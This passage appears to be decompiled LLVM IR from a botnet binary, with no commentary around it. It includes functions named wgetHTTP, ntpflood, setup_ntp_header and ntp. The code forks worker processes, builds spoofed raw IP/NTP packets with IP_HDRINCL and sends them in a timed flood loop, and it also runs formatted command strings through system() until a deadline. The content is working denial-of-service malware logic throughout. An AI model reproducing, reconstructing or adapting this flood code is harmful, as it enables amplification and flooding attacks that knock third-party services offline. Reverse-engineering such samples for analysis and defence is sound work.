  %v1_804b10d = sext i32 %storemerge to i64
  %v2_804b10d = call i32 @usleep(i64 %v1_804b10d)
  %v0_804b112 = load i32, i32* @esp, align 4
  %v1_804b112 = add i32 %v0_804b112, 16
  %v0_804b115 = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804b115, 4294967296
  %v2_804b11e = sdiv i64 %sext, 4294967296
  %v4_804b11e = mul nsw i64 %v2_804b11e, 20
  %v5_804b11e = trunc i64 %v4_804b11e to i32
  store i32 %v5_804b11e, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804b11e, %v1_804af69
  %v0_804b14d = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804b14d, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804b128, label %dec_label_pc_804b14d

dec_label_pc_804b128:                             ; preds = %dec_label_pc_804b0de
  %tmp46 = icmp slt i32 %v0_804b14d, 1
  %tmp47 = icmp eq i1 %tmp46, false
  br i1 %tmp47, label %dec_label_pc_804b140, label %dec_label_pc_804b131

dec_label_pc_804b131:                             ; preds = %dec_label_pc_804b128
  %v0_804b131 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804b136 = add i32 %v0_804b131, 100
  store i32 %v1_804b136, i32* %eax.global-to-local, align 4
  store i32 %v1_804b136, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804b17b

dec_label_pc_804b140:                             ; preds = %dec_label_pc_804b128
  %v1_804b145 = add i32 %v0_804b14d, -1
  store i32 %v1_804b145, i32* %eax.global-to-local, align 4
  store i32 %v1_804b145, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804b17b

dec_label_pc_804b14d:                             ; preds = %dec_label_pc_804b0de
  %v1_804b152 = add i32 %v0_804b14d, 1
  store i32 %v1_804b152, i32* @global_var_807d3c8.89, align 8
  %v0_804b158 = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804b158, i32* %eax.global-to-local, align 4
  %v1_804b15d = add i32 %v0_804b158, -25
  %v5_804b15d = icmp ult i32 %v0_804b158, 25
  %v9_804b15d = icmp eq i32 %v1_804b15d, 0
  %v2_804b160 = or i1 %v5_804b15d, %v9_804b15d
  br i1 %v2_804b160, label %dec_label_pc_804b171, label %dec_label_pc_804b162

dec_label_pc_804b162:                             ; preds = %dec_label_pc_804b14d
  store i32 %v1_804b15d, i32* %eax.global-to-local, align 4
  store i32 %v1_804b15d, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804b17b

dec_label_pc_804b171:                             ; preds = %dec_label_pc_804b14d
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804b17b

dec_label_pc_804b17b:                             ; preds = %dec_label_pc_804b162, %dec_label_pc_804b140, %dec_label_pc_804b131, %dec_label_pc_804b171
  store i64 0, i64* @global_var_807d500.88, align 256
  %v4_804b185 = add i32 %storemerge, 1
  br label %dec_label_pc_804b188

dec_label_pc_804b188:                             ; preds = %dec_label_pc_804b0aa, %dec_label_pc_804b17b
  %v0_804b190 = phi i32 [ %v1_804b112, %dec_label_pc_804b17b ], [ %v1_804b0cf, %dec_label_pc_804b0aa ]
  %storemerge = phi i32 [ %v4_804b185, %dec_label_pc_804b17b ], [ 0, %dec_label_pc_804b0aa ]
  store i32 %v1_804b18b, i32* %eax.global-to-local, align 4
  %v2_804b18e = load i32, i32* %v1_804b18e, align 4
  store i32 %v2_804b18e, i32* %eax.global-to-local, align 4
  %v2_804b193 = add i32 %v0_804b190, -16
  %v3_804b193 = inttoptr i32 %v2_804b193 to i32*
  store i32 %v2_804b18e, i32* %v3_804b193, align 4
  %v1_804b194 = call i32 @atol(i32 %storemerge)
  %v0_804b199 = load i32, i32* @esp, align 4
  %v9_804b19c = mul i32 %v1_804b194, 20
  store i32 %v9_804b19c, i32* %eax.global-to-local, align 4
  %v8_804b1a3 = icmp sgt i32 %v9_804b19c, %storemerge
  br i1 %v8_804b1a3, label %dec_label_pc_804b0de, label %dec_label_pc_804b1a9

dec_label_pc_804b1a9:                             ; preds = %dec_label_pc_804b188
  %v2_804b1ac = inttoptr i32 %v0_804b199 to i32*
  store i32 0, i32* %v2_804b1ac, align 4
  %v1_804b1ae = call i32 @__GI_exit(i32 %storemerge)
  store i32 %v1_804b1ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b1b3

dec_label_pc_804b1b3:                             ; preds = %dec_label_pc_804ae7d, %entry, %dec_label_pc_804b1a9
  %v0_804b1bd = phi i32 [ %v1_804aea9, %dec_label_pc_804ae7d ], [ %v1_804ae20, %entry ], [ %v1_804b1ae, %dec_label_pc_804b1a9 ]
  ret i32 %v0_804b1bd

; uselistorder directives
  uselistorder i32 %v9_804b19c, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v1_804b15d, { 1, 0, 2 }
  uselistorder i32 %v0_804b14d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804b18b, { 1, 0 }
  uselistorder i32 %v2_804b034, { 0, 2, 1 }
  uselistorder i32 %storemerge354, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804b002, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804af52, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804aef6, { 2, 1, 0 }
  uselistorder i32 %v4_804aeb1, { 1, 0 }
  uselistorder i32 %v4_804ae57, { 1, 0 }
  uselistorder i32* %stack_var_-2668, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 7, 8, 9, 1, 2, 4, 5, 3, 6, 10, 11, 12, 13, 14, 16, 15, 40, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b1b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b188, { 1, 0 }
  uselistorder label %dec_label_pc_804b17b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ae7d, { 1, 0 }
  uselistorder label %dec_label_pc_804ae57, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1048 = alloca i32, align 4
  %v1_804b1ce = call i32 @mfork(i32 %arg2)
  %v1_804b1d6 = icmp eq i32 %v1_804b1ce, 0
  %v1_804b1d8 = icmp eq i1 %v1_804b1d6, false
  br i1 %v1_804b1d8, label %dec_label_pc_804b341, label %dec_label_pc_804b1de

dec_label_pc_804b1de:                             ; preds = %entry
  %v4_804b1de = add i32 %arg3, -1
  %v9_804b1de = sub i32 0, %arg3
  %v10_804b1de = and i32 %arg3, %v9_804b1de
  %v11_804b1de = icmp slt i32 %v10_804b1de, 0
  %v12_804b1de = icmp eq i32 %v4_804b1de, 0
  %v13_804b1de = icmp slt i32 %v4_804b1de, 0
  %v3_804b1e2 = icmp eq i1 %v13_804b1de, %v11_804b1de
  %v4_804b1e2 = icmp eq i1 %v12_804b1de, false
  %v5_804b1e2 = and i1 %v4_804b1e2, %v3_804b1e2
  br i1 %v5_804b1e2, label %dec_label_pc_804b204, label %dec_label_pc_804b1e4

dec_label_pc_804b1e4:                             ; preds = %dec_label_pc_804b1de
  %v3_804b1f2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_80690ec.97 to i32))
  %v1_804b1ff = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b204

dec_label_pc_804b204:                             ; preds = %dec_label_pc_804b1de, %dec_label_pc_804b1e4
  %v1_804b207 = add i32 %arg4, 4
  %v1_804b20a = inttoptr i32 %v1_804b207 to i32*
  %v2_804b20a = load i32, i32* %v1_804b20a, align 4
  %v1_804b212 = add i32 %arg4, 8
  %v1_804b215 = inttoptr i32 %v1_804b212 to i32*
  %v2_804b215 = load i32, i32* %v1_804b215, align 4
  %v1_804b21b = call i32 @atol(i32 %v2_804b215)
  %v2_804b22b = call i32 @__GI_time(i32* null)
  %v5_804b233 = add i32 %v2_804b22b, %v1_804b21b
  %v1_804b239 = call i32 @random()
  %v3_804b268 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806910f.148 to i32))
  %v4_804b2c7 = inttoptr i32 %v2_804b20a to i8*
  %v2_804b300 = ptrtoint i32* %stack_var_-1048 to i32
  br label %dec_label_pc_804b321

dec_label_pc_804b275:                             ; preds = %dec_label_pc_804b321
  %v0_804b275 = call i32 @random()
  %v2_804b285 = ashr i32 %v0_804b275, 31
  %v2_804b288 = zext i32 %v0_804b275 to i64
  %v4_804b288 = zext i32 %v2_804b285 to i64
  %v5_804b288 = mul nuw i64 %v4_804b288, 4294967296
  %v6_804b288 = or i64 %v5_804b288, %v2_804b288
  %v10_804b288 = srem i64 %v6_804b288, 36
  %v11_804b288 = trunc i64 %v10_804b288 to i32
  %v1_804b28c = mul i32 %v11_804b288, 4
  %v2_804b28c = add i32 %v1_804b28c, ptrtoint ([49 x i8*]* @global_var_806faa0.147 to i32)
  %v3_804b28c = inttoptr i32 %v2_804b28c to i32*
  %v4_804b28c = load i32, i32* %v3_804b28c, align 4
  %v4_804b2a7 = inttoptr i32 %v4_804b28c to i8*
  %v3_804b2ad = call i32 @_strlen(i8* %v4_804b2a7)
  store i1 false, i1* @df, align 1
  store i32 %v2_804b20a, i32* @edi, align 4
  %v3_804b2cd = call i32 @_strlen(i8* %v4_804b2c7)
  %v3_804b2ad36 = add i32 %v3_804b2ad, %v3_804b2cd
  %v2_804b2d7 = mul i32 %v3_804b2ad36, 4
  %v1_804b2da = add i32 %v2_804b2d7, 164
  %v8_804b307 = call i32 @__GI_snprintf(i32 %v2_804b300, i32 %v1_804b2da, i32 ptrtoint ([181 x i8]* @global_var_806912c.149 to i32), i32 %v4_804b28c, i32 %v2_804b20a, i32 %v4_804b28c, i32 %v2_804b20a)
  %v1_804b319 = call i32 @system(i32 %v2_804b300)
  br label %dec_label_pc_804b321

dec_label_pc_804b321:                             ; preds = %dec_label_pc_804b204, %dec_label_pc_804b275
  %v2_804b326 = call i32 @__GI_time(i32* null)
  %v5_804b331 = icmp slt i32 %v2_804b326, %v5_804b233
  br i1 %v5_804b331, label %dec_label_pc_804b275, label %dec_label_pc_804b337

dec_label_pc_804b337:                             ; preds = %dec_label_pc_804b321
  %v1_804b33c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b341

dec_label_pc_804b341:                             ; preds = %entry, %dec_label_pc_804b337
  %v0_804b345 = phi i32 [ %v1_804b1ce, %entry ], [ %v1_804b33c, %dec_label_pc_804b337 ]
  ret i32 %v0_804b345

; uselistorder directives
  uselistorder i32 %v2_804b20a, { 0, 1, 3, 2 }
  uselistorder i32 %v4_804b1de, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b341, { 1, 0 }
  uselistorder label %dec_label_pc_804b321, { 1, 0 }
  uselistorder label %dec_label_pc_804b204, { 1, 0 }
}

define i32 @setup_ntp_header(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v1_804b354 = call i32 @htons(i32 5678)
  %v2_804b354 = trunc i32 %v1_804b354 to i16
  %sext = mul i32 %v1_804b354, 65536
  %v1_804b35c = sdiv i32 %sext, 65536
  store i32 %v1_804b35c, i32* %edx.global-to-local, align 4
  %v4_804b35e = ptrtoint i16* %arg1 to i32
  store i16 %v2_804b354, i16* %arg1, align 2
  %v1_804b369 = call i32 @htons(i32 123)
  %v2_804b369 = trunc i32 %v1_804b369 to i16
  %v3_804b376 = add i32 %v4_804b35e, 2
  %v4_804b376 = inttoptr i32 %v3_804b376 to i16*
  store i16 %v2_804b369, i16* %v4_804b376, align 2
  %v1_804b37d = add i32 %v4_804b35e, 6
  %v2_804b37d = inttoptr i32 %v1_804b37d to i16*
  store i16 0, i16* %v2_804b37d, align 2
  %v1_804b386 = add i32 %v4_804b35e, 8
  store i32 %v1_804b386, i32* %edx.global-to-local, align 4
  %v2_804b38e = inttoptr i32 %v1_804b386 to i32*
  store i32 704839703, i32* %v2_804b38e, align 4
  %v1_804b395 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b395 = add i32 %v1_804b395, 4
  %v3_804b395 = inttoptr i32 %v2_804b395 to i32*
  store i32 0, i32* %v3_804b395, align 4
  %v1_804b39d = call i32 @htons(i32 16)
  %v2_804b39d = trunc i32 %v1_804b39d to i16
  %sext2 = mul i32 %v1_804b39d, 65536
  %v1_804b3a5 = sdiv i32 %sext2, 65536
  store i32 %v1_804b3a5, i32* %edx.global-to-local, align 4
  %v4_804b3aa = add i32 %v4_804b35e, 4
  %v5_804b3aa = inttoptr i32 %v4_804b3aa to i16*
  store i16 %v2_804b39d, i16* %v5_804b3aa, align 2
  ret i32 %v4_804b35e

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @ntpflood() local_unnamed_addr {
entry:
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %v2_804b3bf = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804b3cb = add i32 %v2_804b3bf, 20
  %v5_804b3ce = inttoptr i32 %v1_804b3cb to i16*
  %v1_804b3dd = add i32 %tmp24, 12
  %v2_804b3dd = inttoptr i32 %v1_804b3dd to i32*
  %v3_804b3dd = load i32, i32* %v2_804b3dd, align 4
  %v1_804b3fb = add i32 %tmp24, 4
  %v2_804b3fb = inttoptr i32 %v1_804b3fb to i32*
  %v3_804b3fb = load i32, i32* %v2_804b3fb, align 4
  %v3_804b40a = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804b415 = icmp slt i32 %v3_804b40a, 0
  %v1_804b419 = icmp eq i1 %v5_804b415, false
  br i1 %v1_804b419, label %entry.dec_label_pc_804b425_crit_edge, label %dec_label_pc_804b41b

entry.dec_label_pc_804b425_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804b425

dec_label_pc_804b41b:                             ; preds = %entry
  %v1_804b420 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804b425

dec_label_pc_804b425:                             ; preds = %entry.dec_label_pc_804b425_crit_edge, %dec_label_pc_804b41b
  %v2_804b42a = call i32 @__GI_time(i32* null)
  %v1_804b433 = call i32 @init_rand(i32 %v2_804b42a)
  %v3_804b44f = bitcast i32* %stack_var_-4124 to i8*
  %v4_804b44f = call i32 @__GI_memset(i8* %v3_804b44f, i32 0, i32 4096)
  store i32 %v4_804b44f, i32* @eax, align 4
  %v2_804b45d = call i32 @setup_ip_header(i8* %v3_804b44f)
  %v2_804b46b = call i32 @setup_ntp_header(i16* %v5_804b3ce)
  %v0_804b473 = call i32 @random()
  %v2_804b483 = ashr i32 %v0_804b473, 31
  %v2_804b486 = zext i32 %v0_804b473 to i64
  %v4_804b486 = zext i32 %v2_804b483 to i64
  %v5_804b486 = mul nuw i64 %v4_804b486, 4294967296
  %v6_804b486 = or i64 %v5_804b486, %v2_804b486
  %v10_804b486 = srem i64 %v6_804b486, 64509
  %v11_804b486 = trunc i64 %v10_804b486 to i32
  %v1_804b48a = add i32 %v11_804b486, 1026
  %v1_804b48f = urem i32 %v1_804b48a, 65536
  %v1_804b498 = call i32 @htons(i32 %v1_804b48f)
  %v2_804b498 = trunc i32 %v1_804b498 to i16
  store i16 %v2_804b498, i16* %v5_804b3ce, align 4
  %v2_804b4b1 = add i32 %v2_804b3bf, 12
  %v3_804b4b1 = inttoptr i32 %v2_804b4b1 to i32*
  store i32 %v3_804b3dd, i32* %v3_804b4b1, align 4
  %v1_804b4b7 = add i32 %v3_804b3fb, 4
  %v2_804b4b7 = inttoptr i32 %v1_804b4b7 to i32*
  %v3_804b4b7 = load i32, i32* %v2_804b4b7, align 4
  %v2_804b4bd = add i32 %v2_804b3bf, 16
  %v3_804b4bd = inttoptr i32 %v2_804b4bd to i32*
  store i32 %v3_804b4b7, i32* %v3_804b4bd, align 4
  %v1_804b4c3 = or i32 %v2_804b3bf, 2
  %v2_804b4c3 = inttoptr i32 %v1_804b4c3 to i16*
  %v3_804b4c3 = load i16, i16* %v2_804b4c3, align 2
  %v3_804b4c7 = udiv i16 %v3_804b4c3, 2
  %v9_804b4c7 = zext i16 %v3_804b4c7 to i32
  %v2_804b4d7 = bitcast i32* %stack_var_-4124 to i16*
  %v3_804b4d7 = call i32 @csum(i16* %v2_804b4d7, i32 %v9_804b4c7)
  %v4_804b4d7 = trunc i32 %v3_804b4d7 to i16
  %v3_804b4e4 = add i32 %v2_804b3bf, 10
  %v4_804b4e4 = inttoptr i32 %v3_804b4e4 to i16*
  store i16 %v4_804b4d7, i16* %v4_804b4e4, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804b4f2 = ptrtoint i32* %stack_var_-4144 to i32
  %v5_804b50a = call i32 @__GI_setsockopt(i32 %v3_804b40a, i32 0, i32 3, i32 %v2_804b4f2, i32 4)
  %v2_804b512 = icmp slt i32 %v5_804b50a, 0
  %v1_804b514 = icmp eq i1 %v2_804b512, false
  br i1 %v1_804b514, label %dec_label_pc_804b520, label %dec_label_pc_804b516

dec_label_pc_804b516:                             ; preds = %dec_label_pc_804b425
  %v1_804b51b = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804b520

dec_label_pc_804b520:                             ; preds = %dec_label_pc_804b425, %dec_label_pc_804b516
  %v2_804b525 = call i32 @__GI_time(i32* null)
  %v1_804b52e = call i32 @init_rand(i32 %v2_804b525)
  %v3_804b59a = add i32 %v2_804b3bf, 4
  %v4_804b59a = inttoptr i32 %v3_804b59a to i16*
  br label %dec_label_pc_804b540

dec_label_pc_804b540:                             ; preds = %dec_label_pc_804b5f9, %dec_label_pc_804b520
  %stack_var_-16.0 = phi i32 [ %v3_804b3fb, %dec_label_pc_804b520 ], [ %v3_804b56f, %dec_label_pc_804b5f9 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804b520 ], [ %v4_804b5f9, %dec_label_pc_804b5f9 ]
  %v3_804b548 = load i16, i16* %v2_804b4c3, align 2
  %v4_804b548 = zext i16 %v3_804b548 to i32
  %v6_804b564 = call i32 @sendto(i32 %v3_804b40a, i32 %v2_804b3bf, i32 %v4_804b548, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804b56f = add i32 %stack_var_-16.0, 532
  %v2_804b56f = inttoptr i32 %v1_804b56f to i32*
  %v3_804b56f = load i32, i32* %v2_804b56f, align 4
  %v1_804b57b = add i32 %v3_804b56f, 4
  %v2_804b57b = inttoptr i32 %v1_804b57b to i32*
  %v3_804b57b = load i32, i32* %v2_804b57b, align 4
  store i32 %v3_804b57b, i32* %v3_804b4bd, align 4
  %v1_804b584 = call i32 @rand_cmwc(i32 %v3_804b56f)
  %v1_804b58d = call i32 @htonl(i32 %v1_804b584)
  %v2_804b58d = trunc i32 %v1_804b58d to i16
  store i16 %v2_804b58d, i16* %v4_804b59a, align 4
  %v3_804b5a1 = load i16, i16* %v2_804b4c3, align 2
  %v3_804b5a5 = udiv i16 %v3_804b5a1, 2
  %v9_804b5a5 = zext i16 %v3_804b5a5 to i32
  %v3_804b5b5 = call i32 @csum(i16* %v2_804b4d7, i32 %v9_804b5a5)
  %v4_804b5b5 = trunc i32 %v3_804b5b5 to i16
  store i16 %v4_804b5b5, i16* %v4_804b4e4, align 2
  %v0_804b5c6 = load i64, i64* @global_var_807d500.88, align 8
  %v1_804b5c6 = trunc i64 %v0_804b5c6 to i32
  %v1_804b5cb = add i32 %v1_804b5c6, 1
  %v1_804b5cc = sext i32 %v1_804b5cb to i64
  store i64 %v1_804b5cc, i64* @global_var_807d500.88, align 256
  %v0_804b5d1 = load i32, i32* @global_var_807d3c8.89, align 8
  %v6_804b5dc = icmp ugt i32 %v0_804b5d1, %storemerge
  br i1 %v6_804b5dc, label %dec_label_pc_804b540.dec_label_pc_804b5f9_crit_edge, label %dec_label_pc_804b5de

dec_label_pc_804b540.dec_label_pc_804b5f9_crit_edge: ; preds = %dec_label_pc_804b540
  br label %dec_label_pc_804b5f9

dec_label_pc_804b5de:                             ; preds = %dec_label_pc_804b540
  %v0_804b5e8 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804b5f1 = sext i32 %v0_804b5e8 to i64
  %v2_804b5f1 = call i32 @usleep(i64 %v1_804b5f1)
  br label %dec_label_pc_804b5f9

dec_label_pc_804b5f9:                             ; preds = %dec_label_pc_804b540.dec_label_pc_804b5f9_crit_edge, %dec_label_pc_804b5de
  %stack_var_-4152.0 = phi i32 [ %storemerge, %dec_label_pc_804b540.dec_label_pc_804b5f9_crit_edge ], [ 0, %dec_label_pc_804b5de ]
  %v4_804b5f9 = add i32 %stack_var_-4152.0, 1
  br label %dec_label_pc_804b540

; uselistorder directives
  uselistorder i32 %v3_804b56f, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804b3bf, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder label %dec_label_pc_804b5f9, { 1, 0 }
  uselistorder label %dec_label_pc_804b520, { 1, 0 }
  uselistorder label %dec_label_pc_804b425, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1088 = alloca i32, align 4
  %stack_var_-1164 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %v15_804b60a = ptrtoint i32* %stack_var_-1132 to i32
  store i32 %v15_804b60a, i32* @eax, align 4
  %v1_804b61e = call i32 @mfork(i32 %arg2)
  store i32 %v1_804b61e, i32* %eax.global-to-local, align 4
  %v1_804b626 = icmp eq i32 %v1_804b61e, 0
  %v1_804b628 = icmp eq i1 %v1_804b626, false
  br i1 %v1_804b628, label %dec_label_pc_804bb8a, label %dec_label_pc_804b62e

dec_label_pc_804b62e:                             ; preds = %entry
  %v3_804b63a = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804b63a, i32* %eax.global-to-local, align 4
  %v5_804b645 = icmp slt i32 %v3_804b63a, 0
  %v1_804b649 = icmp eq i1 %v5_804b645, false
  br i1 %v1_804b649, label %dec_label_pc_804b655, label %dec_label_pc_804b64b

dec_label_pc_804b64b:                             ; preds = %dec_label_pc_804b62e
  %v1_804b650 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804b650, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b655

dec_label_pc_804b655:                             ; preds = %dec_label_pc_804b62e, %dec_label_pc_804b64b
  %v4_804b655 = add i32 %arg3, -5
  %v9_804b655 = sub i32 4, %arg3
  %v10_804b655 = and i32 %v9_804b655, %arg3
  %v11_804b655 = icmp slt i32 %v10_804b655, 0
  %v12_804b655 = icmp eq i32 %v4_804b655, 0
  %v13_804b655 = icmp slt i32 %v4_804b655, 0
  %v3_804b659 = icmp eq i1 %v13_804b655, %v11_804b655
  %v4_804b659 = icmp eq i1 %v12_804b655, false
  %v5_804b659 = and i1 %v4_804b659, %v3_804b659
  br i1 %v5_804b659, label %dec_label_pc_804b67b, label %dec_label_pc_804b65b

dec_label_pc_804b65b:                             ; preds = %dec_label_pc_804b655
  store i32 %arg1, i32* %stack_var_-1164, align 4
  %v3_804b669 = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_80691ec.152 to i32))
  store i32 %v3_804b669, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-1164, align 4
  %v1_804b676 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804b676, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b67b

dec_label_pc_804b67b:                             ; preds = %dec_label_pc_804b655, %dec_label_pc_804b65b
  %v1_804b67e = add i32 %arg4, 12
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v1_804b681 = inttoptr i32 %v1_804b67e to i32*
  %v2_804b681 = load i32, i32* %v1_804b681, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804b68e = and i32 %v2_804b681, -256
  store i32 %v1_804b68e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804b691 = inttoptr i32 %v2_804b681 to i8*
  %v3_804b697 = call i32 @_strlen(i8* %v4_804b691)
  %v4_804b697 = mul i32 %v3_804b697, -1
  %v5_804b697 = add i32 %v4_804b697, -2
  store i32 %v5_804b697, i32* %ecx.global-to-local, align 4
  %v1_804b69d = sub i32 0, %v4_804b697
  store i32 %v1_804b69d, i32* %edx.global-to-local, align 4
  %v2_804b6a5 = mul i32 %v3_804b697, 5
  %v1_804b6a7 = add i32 %v2_804b6a5, 160
  store i32 %v1_804b6a7, i32* %eax.global-to-local, align 4
  %v4_804b6af = add i32 %v2_804b6a5, -863
  %v9_804b6af = sub i32 862, %v2_804b6a5
  %v10_804b6af = and i32 %v9_804b6af, %v1_804b6a7
  %v11_804b6af = icmp slt i32 %v10_804b6af, 0
  %v12_804b6af = icmp eq i32 %v4_804b6af, 0
  %v13_804b6af = icmp slt i32 %v4_804b6af, 0
  %v3_804b6b6 = icmp eq i1 %v13_804b6af, %v11_804b6af
  %v4_804b6b6 = icmp eq i1 %v12_804b6af, false
  %v5_804b6b6 = and i1 %v4_804b6b6, %v3_804b6b6
  br i1 %v5_804b6b6, label %dec_label_pc_804bb8a, label %dec_label_pc_804b6bc

dec_label_pc_804b6bc:                             ; preds = %dec_label_pc_804b67b
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v2_804b6c2 = load i32, i32* %v1_804b681, align 4
  store i32 %v2_804b6c2, i32* %edx.global-to-local, align 4
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v2_804b6ca = load i32, i32* %v1_804b681, align 4
  store i32 %v2_804b6ca, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v2_804b6d2 = load i32, i32* %v1_804b681, align 4
  store i32 %v2_804b6d2, i32* @ebx, align 4
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v2_804b6da = load i32, i32* %v1_804b681, align 4
  store i32 %v2_804b6da, i32* @esi, align 4
  store i32 %v1_804b67e, i32* %eax.global-to-local, align 4
  %v2_804b6e2 = load i32, i32* %v1_804b681, align 4
  store i32 %v1_804b6a7, i32* @edi, align 4
  %v2_804b6f2 = ptrtoint i32* %stack_var_-1088 to i32
  store i32 %v2_804b6f2, i32* %eax.global-to-local, align 4
  %v9_804b6f9 = call i32 @__GI_snprintf(i32 %v2_804b6f2, i32 %v1_804b6a7, i32 ptrtoint ([171 x i8]* @global_var_806925c.153 to i32), i32 %v2_804b6e2, i32 %v2_804b6da, i32 %v2_804b6d2, i32 %v2_804b6ca)
  %v12_804b6fe = ptrtoint i32* %stack_var_-1164 to i32
  store i32 %v2_804b6f2, i32* %eax.global-to-local, align 4
  %v2_804b70b = call i32 @system(i32 %v2_804b6f2)
  store i32 %v2_804b70b, i32* %eax.global-to-local, align 4
  %v3_804b718 = call i32 @__GI_time(i32* null)
  store i32 %v3_804b718, i32* %eax.global-to-local, align 4
  %v2_804b724 = call i32 @srand(i32 %v3_804b718)
  store i32 0, i32* @global_var_807e520.80, align 32
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804b74b = call i32 @malloc(i32 128)
  store i32 %v2_804b74b, i32* %edx.global-to-local, align 4
  %v1_804b75c = inttoptr i32 %v2_804b74b to i8*
  store i32 %v2_804b74b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b763 = call i8* @_memset(i8* %v1_804b75c, i32 0, i32 128)
  %v6_804b763 = ptrtoint i8* %v5_804b763 to i32
  store i32 %v6_804b763, i32* %ecx.global-to-local, align 4
  %v0_804b765 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b76d = add i32 %arg4, 16
  store i32 %v1_804b76d, i32* %eax.global-to-local, align 4
  %v1_804b770 = inttoptr i32 %v1_804b76d to i32*
  %v2_804b770 = load i32, i32* %v1_804b770, align 4
  store i32 %v2_804b770, i32* %eax.global-to-local, align 4
  %v2_804b776 = call i32 @atol(i32 %v2_804b770)
  %v1_804b784 = add i32 %arg4, 20
  store i32 %v1_804b784, i32* %eax.global-to-local, align 4
  %v1_804b787 = inttoptr i32 %v1_804b784 to i32*
  %v2_804b787 = load i32, i32* %v1_804b787, align 4
  store i32 %v2_804b787, i32* %eax.global-to-local, align 4
  %v2_804b78d = call i32 @atol(i32 %v2_804b787)
  store i32 %v2_804b78d, i32* @eax, align 4
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v3_804b7c0 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_8069307.154 to i32), i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32))
  store i32 %v3_804b7c0, i32* %eax.global-to-local, align 4
  %v8_804b942 = inttoptr i32 %v0_804b765 to i8*
  %v1_804b7de = and i32 %v0_804b765, -256
  %v5_804b842 = add i32 %v0_804b765, -1
  br label %dec_label_pc_804b939.outer

